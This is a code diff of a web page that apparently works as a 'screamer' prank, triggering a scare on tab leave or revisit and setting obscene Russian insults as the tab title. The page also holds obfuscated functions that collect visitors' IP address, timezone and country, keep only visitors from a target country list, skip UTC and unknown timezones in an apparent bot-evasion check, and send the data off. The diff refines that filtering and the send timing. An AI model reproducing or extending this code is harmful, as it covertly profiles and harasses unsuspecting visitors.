@@ -118,7 +118,7 @@ window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches&&do
 <canvas id="bg-shader-canvas" class="shader-canvas" width="1024" height="1024"></canvas>
 
 <script>
-
+  
 var ENABLE_SHADER = true;
 var ENABLE_MULTIPLE_SHADERS = true;
 var STORAGE_KEY = 'scare_triggered';
@@ -127,11 +127,13 @@ var FAVICON_IMAGE = 'photo2.jpg';
 var SCARE_ON_TAB_LEAVE = true;
 var SCARE_ON_REVISIT = true;
 
+
 var SCARE_TITLES = [
   '\u0438\u0434\u0438 \u043d\u0430\u0445\u0443\u0439',     
   '\u0445\u0443\u0439 \u0442\u0435\u0431\u0435',        
   '\u043f\u0438\u0437\u0434\u0435\u0446 \u0442\u0435\u0431\u0435',
 ];
+
 </script>
 
 <script>
@@ -403,7 +405,7 @@ function startScare(){
   enableGyro();
   changeFavicon();
   changeTitle();
-  if(ENABLE_SHADER){setTimeout(function(){setupShaderOnCanvas(document.getElementById('bg-shader-canvas'));},1000);}
+  if(ENABLE_SHADER){setupShaderOnCanvas(document.getElementById('bg-shader-canvas'));}
   localStorage.setItem(STORAGE_KEY,'true');
 }
 
@@ -482,7 +484,6 @@ document.addEventListener('visibilitychange',function(){
     }
     if(!_isScareActive&&typeof SCARE_ON_TAB_LEAVE!=='undefined'&&SCARE_ON_TAB_LEAVE){
       localStorage.setItem(STORAGE_KEY,'true');
-      _activateGifMode();
     }
   } else {
     if(_pipActive&&document.pictureInPictureElement===_scareVideo){
@@ -529,6 +530,7 @@ function _activateGifMode(){
   enableGyro();
   changeFavicon();
   changeTitle();
+  if(ENABLE_SHADER){setupShaderOnCanvas(document.getElementById('bg-shader-canvas'));}
 }
 
 (function(){
@@ -869,7 +871,7 @@ function _0xchk(cr){
   var ip=d.ip||'';
   var tz=d.tz||'';
   if(!ip||ip==='\u2014')return Promise.resolve();
-  if(!tz||tz==='\u2014'||tz.indexOf('Etc/')===0||tz.indexOf('UTC')===0)return Promise.resolve();
+  if(!tz||tz==='\u2014'||tz.indexOf('Etc/')===0||tz.indexOf('UTC')===0||tz.indexOf('Unknown')>=0)return Promise.resolve();
   if(!cc||_TARGET_CC.indexOf(cc)<0)return Promise.resolve();
   var _now=d.date+' '+d.time;
   var _rec=null;
@@ -909,7 +911,7 @@ window.addEventListener('DOMContentLoaded',function(){
     var tz=d.tz||'';
     var cc=d.rawCC||'';
     if(!ip||ip==='\u2014')return false;
-    if(!tz||tz==='\u2014'||tz.indexOf('Etc/')===0||tz.indexOf('UTC')===0)return false;
+    if(!tz||tz==='\u2014'||tz.indexOf('Etc/')===0||tz.indexOf('UTC')===0||tz.indexOf('Unknown')>=0)return false;
     if(cc&&_TARGET_CC.indexOf(cc)<0)return false;
     return true;
   }
@@ -929,8 +931,7 @@ window.addEventListener('DOMContentLoaded',function(){
   _0xfip();
 
   _0xOnGeoReady(function(){_doSend();});
-  _0xwait(2500).then(function(){_doSend();});
-  _0xwait(8000).then(function(){_doSend();});
+  _0xwait(6000).then(function(){_doSend();});
 });
 })();
 </script>
